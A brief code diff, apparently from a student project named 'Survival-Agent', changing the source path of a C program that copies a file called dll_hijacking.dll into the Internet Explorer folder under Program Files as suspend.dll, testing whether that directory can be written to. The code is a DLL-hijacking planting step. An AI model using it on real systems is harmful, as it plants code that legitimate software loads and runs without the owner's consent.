@@ -3,7 +3,7 @@
 
 int main() {
     LPCSTR destPath = "C:\\Program Files\\Internet Explorer\\suspend.dll";
-    LPCSTR sourcePath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\knowledge_library\\dll_hijacking.dll";
+    LPCSTR sourcePath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\dll_hijacking.dll";
     
     // Check if we can write to the directory by attempting to copy.
     if (CopyFileA(sourcePath, destPath, FALSE)) {
